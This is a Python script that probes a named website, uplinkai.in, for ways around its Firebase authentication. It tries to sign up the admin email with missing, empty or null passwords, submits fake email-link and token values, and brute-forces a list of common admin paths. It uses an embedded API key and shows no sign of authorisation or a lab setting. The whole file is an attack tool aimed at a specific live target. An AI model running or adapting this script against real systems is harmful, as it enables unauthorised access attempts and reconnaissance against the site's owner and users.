import requests
import json
import time
import urllib.parse

# Test Firebase Authentication bypass techniques
def test_firebase_bypass():
    print("=== Testing Firebase Authentication Bypass Techniques ===")
    
    api_key = "AIzaSyA0grBMnQ2VnDKD-Q8QFkA7cirthBYcmFY"
    firebase_api_base = "https://identitytoolkit.googleapis.com/v1"
    
    # Test 1: Try to create a custom token without proper authentication
    create_token_url = f"{firebase_api_base}/accounts:signUp?key={api_key}"
    
    # Test with no password (should fail)
    test_data_no_pass = {
        "email": "admin@uplinkai.in",
        "returnSecureToken": True
    }
    
    try:
        response = requests.post(create_token_url, json=test_data_no_pass, timeout=10)
        print(f"No password test: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error testing no password: {e}")
    
    # Test 2: Try with empty password
    test_data_empty_pass = {
        "email": "admin@uplinkai.in",
        "password": "",
        "returnSecureToken": True
    }
    
    try:
        response = requests.post(create_token_url, json=test_data_empty_pass, timeout=10)
        print(f"Empty password test: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error testing empty password: {e}")
    
    # Test 3: Try with null password
    test_data_null_pass = {
        "email": "admin@uplinkai.in",
        "password": None,
        "returnSecureToken": True
    }
    
    try:
        response = requests.post(create_token_url, json=test_data_null_pass, timeout=10)
        print(f"Null password test: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error testing null password: {e}")
    
    # Test 4: Try to use signInWithEmailLink without proper email link
    signin_email_link_url = f"{firebase_api_base}/accounts:signInWithEmailLink?key={api_key}"
    
    test_data_fake_link = {
        "email": "admin@uplinkai.in",
        "oobCode": "fake_oob_code_here"
    }
    
    try:
        response = requests.post(signin_email_link_url, json=test_data_fake_link, timeout=10)
        print(f"Fake email link test: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error testing fake email link: {e}")
    
    # Test 5: Try to enumerate users via lookup
    lookup_url = f"{firebase_api_base}/accounts:lookup?key={api_key}"
    
    test_data_lookup = {
        "idToken": "fake_token_here"
    }
    
    try:
        response = requests.post(lookup_url, json=test_data_lookup, timeout=10)
        print(f"Lookup with fake token: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error testing lookup: {e}")

# Test 6: Check for any exposed admin endpoints
def check_admin_endpoints():
    print("\n=== Checking for Admin Endpoints ===")
    
    admin_paths = [
        "/admin",
        "/admin.html", 
        "/admin/auth",
        "/admin/login",
        "/dashboard",
        "/dashboard.html",
        "/panel",
        "/panel.html",
        "/control",
        "/control.html",
        "/management",
        "/management.html",
        "/root",
        "/root.html",
        "/superuser",
        "/superuser.html",
        "/staff",
        "/staff.html",
        "/internal",
        "/internal.html"
    ]
    
    base_url = "https://uplinkai.in"
    
    for path in admin_paths:
        try:
            full_url = f"{base_url}{path}"
            response = requests.head(full_url, timeout=10)
            print(f"{path}: {response.status_code}")
            if response.status_code == 200:
                print(f"  -> Found accessible endpoint: {full_url}")
        except Exception as e:
            print(f"{path}: Error - {e}")

if __name__ == "__main__":
    test_firebase_bypass()
    check_admin_endpoints()
